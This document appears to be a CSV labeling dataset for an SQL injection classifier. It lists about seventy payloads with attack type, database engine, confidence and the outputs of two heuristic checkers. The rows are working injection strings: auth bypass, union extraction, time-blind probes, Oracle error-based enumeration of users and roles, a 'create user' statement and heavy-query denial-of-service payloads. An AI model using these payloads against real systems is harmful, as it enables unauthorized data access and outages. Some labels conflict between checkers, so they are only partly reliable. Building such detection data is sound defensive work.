payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
; if is_srvrolemember ( 'sysadmin' ) > 0 waitfor delay '0:0:2' --,time_blind,mssql,0.95,is_srvrolemember + waitfor for MSSQL time blind,KEEP,,time_blind,mssql,279,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,; if is_srvrolemember ( 'sysadmin' ) > 0 waitfor delay '0:0:2' --
select * from users where id = 1 <@<@ or 1 = 1 -- 1,boolean_blind,mysql,0.8,<@<@ for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,280,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 <@<@ or 1 = 1 -- 1
"select * from users where id = 1 union select @<@$,version ( ) -- 1",union_based,mysql,0.8,@<@$ + version() for union SQLi,KEEP,,union_based,mysql,281,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select @<@$,version ( ) -- 1"
"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'",union_based,mysql,0.85,<@<@ union select for union SQLi,KEEP,,union_based,mysql,282,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'"
"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",boolean_blind,mysql,0.8,$_ obfuscation for boolean blind SQLi,KEEP,,boolean_blind,mysql,283,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""$_"" or 1 = 1 -- 1"
"select * from users where id = 1 or 1#""{ union select version ( ) ,version ( ) -- 1",union_based,mysql,0.8,1#{ union select version twice,KEEP,,union_based,mysql,284,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""{ union select version ( ) ,version ( ) -- 1"
a' or 1 = 1--,boolean_blind,generic,0.95,a' or 1=1-- for boolean blind SQLi,KEEP,,boolean_blind,generic,285,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",a' or 1 = 1--
) or ( a = a,boolean_blind,generic,0.9,) or (a=a) for boolean blind SQLi,KEEP,,boolean_blind,generic,286,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,) or ( a = a
""" ) ) or ( ( ""x"" ) ) = ( ( ""x",boolean_blind,generic,0.8,")) or ((\x\"")) = ((\""x for boolean blind""",KEEP,,boolean_blind,generic,287,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,""" ) ) or ( ( ""x"" ) ) = ( ( ""x"
"select * from users where id = 1 or 1#""; or 1 = 1 -- 1",boolean_blind,mysql,0.8,"#\; or 1=1 for boolean blind SQLi""",KEEP,,boolean_blind,mysql,288,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or 1#""; or 1 = 1 -- 1"
"select * from users where id = '1' <@$_ union select 1,version ( ) -- 1'",union_based,mysql,0.85,<@$_ union select for union SQLi,KEEP,,union_based,mysql,289,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = '1' <@$_ union select 1,version ( ) -- 1'"
-- &password =,boolean_blind,generic,0.8,&password = for boolean blind SQLi,KEEP,,boolean_blind,generic,290,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-- &password =
select * from users where id = 1 <@. or 1 = 1 -- 1,boolean_blind,mysql,0.8,<@. for boolean-based blind SQLi,KEEP,,boolean_blind,mysql,291,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 <@. or 1 = 1 -- 1
"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",union_based,mssql,0.8,% 1 + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,292,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",error_based,oracle,0.95,dba_role_privs + utl_inaddr error SQLi,KEEP,,error_based,oracle,293,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 3 ) ) AND 'i' = 'i"
admin' or 1 = 1,auth_bypass,generic,0.95,admin' or 1=1 for auth bypass,KEEP,,auth_bypass,generic,294,auth_bypass,generic,Pattern match: 'admin' or 1 = 1' → auth_bypass (P2); DB signature: generic,auth_bypass,generic,admin' prefix near boolean/comment context,admin' or 1 = 1
"select * from users where id = 1 union select @||1,version ( ) -- 1",union_based,mysql,0.85,@||1 + version() for union SQLi,KEEP,,union_based,mysql,295,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select @||1,version ( ) -- 1"
"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",union_based,mssql,0.8,\+. + @@VERSION for MSSQL union SQLi,KEEP,,union_based,mssql,296,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 +\+. union select null,@@VERSION -- 1"
"select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",boolean_blind,generic,0.85,OR 1=1 with backslash obfuscation for bypass,KEEP,,boolean_blind,generic,297,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""\#"" or 1 = 1 -- 1"
"select * from users where id = 1 or 1#""; union select version ( ) ,version ( ) -- 1",union_based,mysql,0.9,UNION SELECT with version() for MySQL data extraction,KEEP,,union_based,mysql,298,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""; union select version ( ) ,version ( ) -- 1"
"select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1",boolean_blind,generic,0.8,OR 1=1 with parenthesis obfuscation,KEEP,,boolean_blind,generic,299,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""1 ) "" or 1 = 1 -- 1"
1 or 1 = 1,boolean_blind,generic,0.95,Classic OR 1=1 boolean-based blind,KEEP,,boolean_blind,generic,300,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 or 1 = 1
"select * from users where id = 1 or @`\` union select 1,version ( ) -- 1",union_based,mysql,0.9,UNION SELECT with backtick obfuscation,KEEP,,union_based,mysql,301,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or @`\` union select 1,version ( ) -- 1"
"select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",boolean_blind,generic,0.8,OR 1=1 with underscore obfuscation,KEEP,,boolean_blind,generic,302,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""_{"" or 1 = 1 -- 1"
"select * from users where id = 1 -@<@ union select null,version ( ) -- 1",union_based,mysql,0.9,UNION SELECT with -@<@ obfuscation for bypass,KEEP,,union_based,mysql,303,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 -@<@ union select null,version ( ) -- 1"
"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1",union_based,oracle,0.9,UNION SELECT with v$version for Oracle,KEEP,,union_based,oracle,304,union_based,oracle,Pattern match: 'union select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",error_based,oracle,0.9,utl_inaddr.get_host_address for Oracle error-based,KEEP,,error_based,oracle,305,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 4 ) ) AND 'i' = 'i"
or 1 = 1#,boolean_blind,generic,0.9,OR 1=1 with comment for boolean blind,KEEP,,boolean_blind,generic,306,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",or 1 = 1#
"select * from users where id = 1 or ""{%"" or 1 = 1 -- 1",boolean_blind,generic,0.8,OR 1=1 with curly brace obfuscation,KEEP,,boolean_blind,generic,307,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""{%"" or 1 = 1 -- 1"
"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 7 ) ) AND 'i' = 'i",error_based,oracle,0.9,utl_inaddr.get_host_address for Oracle,KEEP,,error_based,oracle,308,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 7 ) ) AND 'i' = 'i"
create user name identified by 'pass123',stacked_queries,generic,0.9,CREATE USER for stacked queries,KEEP,,stacked_queries,generic,309,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,create user name identified by 'pass123'
"select * from users where id = 1.*\ union select null,@@VERSION -- 1",union_based,mysql,0.9,UNION SELECT with .\* obfuscation,KEEP,,union_based,mysql,310,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1.*\ union select null,@@VERSION -- 1"
"select * from users where id = 1 or 1#""{ union select 'a',version ( ) -- 1",union_based,mysql,0.9,"UNION SELECT with 1#"""" obfuscation",KEEP,,union_based,mysql,311,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 or 1#""{ union select 'a',version ( ) -- 1"
"select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1",boolean_blind,generic,0.8,OR 1=1 with comma obfuscation,KEEP,,boolean_blind,generic,312,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or "" ( ,"" = 1 or 1 = 1 -- 1"
select * from users where id = 1 <@1$ or 1 = 1 -- 1,boolean_blind,generic,0.85,OR with $ obfuscation for boolean blind,KEEP,,boolean_blind,generic,313,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",select * from users where id = 1 <@1$ or 1 = 1 -- 1
"select * from users where id = 1 union select @&&@,version ( ) -- 1",union_based,mysql,0.9,UNION SELECT with && obfuscation,KEEP,,union_based,mysql,314,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select @&&@,version ( ) -- 1"
"select * from users where id = 1 or ""?["" or 1 = 1 -- 1",boolean_blind,generic,0.8,OR with ?[ obfuscation,KEEP,,boolean_blind,generic,315,boolean_blind,generic,Pattern match: 'or 1 = 1' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","select * from users where id = 1 or ""?["" or 1 = 1 -- 1"
"select * from users where id = 1 union select !<@,version ( ) -- 1",union_based,mysql,0.9,UNION SELECT with !<@ obfuscation,KEEP,,union_based,mysql,316,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"select * from users where id = 1 union select !<@,version ( ) -- 1"
"or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,0.9,benchmark() for time-based blind,KEEP,,time_blind,mysql,317,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"or benchmark ( 10000000,MD5 ( 1 ) ) #"
""" or sleep ( __TIME__ ) = """,time_blind,generic,0.85,sleep() for time-based blind,KEEP,,time_blind,generic,318,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,""" or sleep ( __TIME__ ) = """
sleep ( __TIME__ ) #,time_blind,generic,0.85,sleep() with TIME variable,KEEP,,time_blind,generic,319,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,sleep ( __TIME__ ) #
"1' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,generate_series for heavy query DoS,KEEP,,heavy_query,postgresql,320,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1 ) as clye where 7842 = 7842 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,char concatenation with regexp_substring for blind inference,KEEP,,boolean_blind,postgresql,321,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) as clye where 7842 = 7842 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"-4860' ) as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#",union_based,generic,0.9,UNION ALL for data extraction,KEEP,,union_based,generic,322,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4860' ) as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#"
"1%' ) ) union all select null,null,null,null,null#",union_based,generic,0.85,UNION ALL with NULL values,KEEP,,union_based,generic,323,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) union all select null,null,null,null,null#"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 6866 = 6866",time_blind,mysql,0.9,benchmark() for time-based blind,KEEP,,time_blind,mysql,324,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 6866 = 6866"
1 ) as boed where 6787 = 6787,boolean_blind,generic,0.85,WHERE clause equality for blind,KEEP,,boolean_blind,generic,325,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as boed where 6787 = 6787
"1"" where 4281 = 4281",boolean_blind,generic,0.8,WHERE equality for boolean blind,KEEP,,boolean_blind,generic,326,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 4281 = 4281"
"1%"" ) and 8024 = 3560--",boolean_blind,generic,0.75,AND equality comparison,KEEP,,boolean_blind,generic,327,boolean_blind,generic,Pattern match: 'and 8024 = 3560' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) and 8024 = 3560--"
"1"" ) and ( 5452 = 6050 ) *6050 and ( ""ciyc"" like ""ciyc",boolean_blind,generic,0.75,Boolean comparison for blind,KEEP,,boolean_blind,generic,328,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" ) and ( 5452 = 6050 ) *6050 and ( ""ciyc"" like ""ciyc"
"1"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for SQLite time-based blind,KEEP,,time_blind,sqlite,329,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1', ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",time_blind,mysql,0.9,sleep() conditional for time blind,KEEP,,time_blind,mysql,330,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1', ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )"
"1'|| ( select 'rawn' from dual where 4988 = 4988 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'",boolean_blind,oracle,0.85,Oracle dual with char() for blind,KEEP,,boolean_blind,oracle,331,boolean_blind,oracle,generic SQL keywords without specific signal,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'rawn' from dual where 4988 = 4988 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) ||'"
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",union_based,generic,0.85,UNION ALL for data extraction,KEEP,,union_based,generic,332,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#"
"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep() for PostgreSQL time blind,KEEP,,time_blind,postgresql,333,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --"
-9534%' or 3038 = 3038,boolean_blind,generic,0.85,OR equality for boolean blind,KEEP,,boolean_blind,generic,334,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9534%' or 3038 = 3038
"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,335,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --"
select ( case when ( 7978 = 6009 ) then 7978 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,336,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 7978 = 6009 ) then 7978 else 1/ ( select 0 ) end ) --
"-1212%' ) or make_set ( 7588 = 2306,2306 ) and ( '%' = '",boolean_blind,mysql,0.8,make_set() for MySQL boolean blind,KEEP,,boolean_blind,mysql,337,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-1212%' ) or make_set ( 7588 = 2306,2306 ) and ( '%' = '"
"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,338,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"-3794' ) union all select 2485,2485,2485,2485,2485--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,339,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3794' ) union all select 2485,2485,2485,2485,2485--"
"1' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,340,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"-6400 ) ) union all select 4650,4650,4650--",union_based,generic,0.85,UNION ALL for data extraction,KEEP,,union_based,generic,341,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6400 ) ) union all select 4650,4650,4650--"
"1"" ) as ztkr where 1532 = 1532",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,342,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as ztkr where 1532 = 1532"
"1' ) where 9842 = 9842 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,343,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 9842 = 9842 union all select null,null,null,null,null,null,null,null#"
"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'uwep' = 'uwep",boolean_blind,postgresql,0.8,regexp_substring for PostgreSQL blind,KEEP,,boolean_blind,postgresql,344,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and 'uwep' = 'uwep"
"-4291"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xyhi"" = ""xyhi",error_based,oracle,0.9,Oracle text index for error-based,KEEP,,error_based,oracle,345,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-4291"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xyhi"" = ""xyhi"
"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 7240 = 7240",heavy_query,postgresql,0.9,generate_series for heavy query DoS,KEEP,,heavy_query,postgresql,346,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 7240 = 7240"
1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548,boolean_blind,postgresql,0.8,IN with char concatenation for blind,KEEP,,boolean_blind,postgresql,347,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548
1 ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 6406 = 6406,boolean_blind,firebird,0.8,Case when for Firebird blind,KEEP,,boolean_blind,firebird,348,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1 ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 6406 = 6406
